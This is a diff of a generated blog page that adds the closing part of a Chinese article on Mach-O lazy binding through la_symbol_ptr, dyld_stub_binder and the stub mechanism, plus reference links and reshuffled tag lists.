+<p><img src="https://github.com/NULL-ME/NULL-ME.github.io/blob/master/articlePic/mach-o%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5/la_symbol_ptr%E9%AA%8C%E8%AF%812.png?raw=true" alt="验证1"></p>
+<ul>
+<li>第二次<code>printf</code>我们在观察<code>DATA</code>段<code>la_symbol_ptr</code>区地址值</li>
+</ul>
+<p><img src="https://github.com/NULL-ME/NULL-ME.github.io/blob/master/articlePic/mach-o%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5/%E7%AC%AC%E4%BA%8C%E6%AC%A1printf%E9%AA%8C%E8%AF%81.png?raw=true" alt="第二次"></p>
+<p>我们会发现当第二次再次调用<code>printf</code>函数时，还是会先跳转到stub区，但此时<code>la_symbol_ptr</code>中的值却变为了<code>printf</code>的真实地址，而不是<code>dyld_stub_binder</code>。这样就完成了一次延时绑定，后面就直接调用。</p>
+<h2 id="0x02-stub桩机制总结"><a href="#0x02-stub桩机制总结" class="headerlink" title="0x02 stub桩机制总结"></a>0x02 stub桩机制总结</h2><p>综上分析，我们可以发现所有的外部函数引用都会在<code>DATA</code>段<code>la_symbol_ptr</code>区中产生一个占位符，其初始值为<code>dyld_stub_binder</code>区中对应的编号地址。当第一个调用时，就会进入符号的动态链接过程，一旦找到其地址后，就会将<code>DATA</code>段<code>la_symbol_ptr</code>区中的占位符改为找到后的地址。这样就完成了只需要一个符号绑定。</p>
+<p>stub桩机制的巧妙之处也在此，首先当产生一个外部符号调用时，直接跳到对应的stub桩位置，然后由里面保存的地址来判断是第一次调用还是已经找到符号的地址。就像桩这个名字含义一样，一个占位符的思想。</p>
+<h2 id="0x03-参考"><a href="#0x03-参考" class="headerlink" title="0x03 参考"></a>0x03 参考</h2><p><a href="http://turingh.github.io/2016/03/10/Mach-O%E7%9A%84%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5/" target="_blank" rel="external">Mach-O的动态链接相关知识</a></p>
+<p><a href="http://timetobleed.com/dynamic-linking-elf-vs-mach-o/" target="_blank" rel="external">Dynamic Linking: ELF vs. Mach-O</a></p>
+<p><a href="http://timetobleed.com/dynamic-symbol-table-duel-elf-vs-mach-o-round-2/" target="_blank" rel="external">Dynamic symbol table duel: ELF vs Mach-O, round 2</a></p>
+
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+	<div class="article-tag tagcloud">
+		<i class="icon-price-tags icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color2">mach-o</a>
+        		</li>
+      		 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">dyld</a>
+        		</li>
+      		 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">stub</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="2017/04/10/mach-o动态链接/mach-o动态链接/">展开全文 >></a>
         </p>
       
 
@@ -1491,6 +1490,14 @@
           <ul class="article-tag-list" q-show="showTags">
              
               <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color4">C++</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color2">vtable</a>
+              </li>
+             
+              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color4">cve</a>
               </li>
              
@@ -1516,14 +1523,6 @@
              
               <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color5">free</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color4">C++</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color2">vtable</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -1583,18 +1582,6 @@
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color4">xnu</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color3">macos内核</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color4">BSD</a>
-              </li>
-             
-              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color2">mach-o</a>
               </li>
              
@@ -1604,6 +1591,18 @@
              
               <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color5">stub</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color4">xnu</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color3">macos内核</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color4">BSD</a>
               </li>
             
             <div class="clearfix"></div>
